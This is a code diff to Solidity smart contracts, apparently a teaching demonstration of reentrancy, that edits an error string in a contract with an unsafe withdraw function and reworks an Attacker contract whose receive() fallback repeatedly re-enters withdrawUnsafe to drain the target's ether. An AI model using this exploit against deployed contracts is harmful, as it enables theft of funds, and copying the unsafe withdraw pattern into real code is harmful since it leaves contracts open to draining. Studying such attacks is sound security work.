@@ -103,7 +103,7 @@ contract Second is First, ISecond{
         balance[holder] = 0;
 
         (bool success, ) = holder.call{value: _balance}("");
-        require(success, "withdrawUnsafe: ether wasn't sent");
+        require(success, "withdrawSafe: ether wasn't sent");
 
     }
 
@@ -126,19 +126,18 @@ contract Attacker is IAttacker {
     }
 
     receive() external payable {
-        if (address(secondContract).balance >= 0.0001 ether) {
+        if (address(secondContract).balance != 0 ether) {
             secondContract.withdrawUnsafe(payable(address(this)));
         }
     }
 
-    function increaseBalance() external payable {
+    function increaseBalance() public payable {
         (bool sent, ) = address(secondContract).call{value: msg.value}("somedata");
         require(sent);
     }
 
     function attack() external payable {
-        require(msg.value == 0.0001 ether, "Require 0.0001 Ether to attack");
-        this.increaseBalance();
+        increaseBalance();
         secondContract.withdrawUnsafe(payable(address(this)));
     }
 }
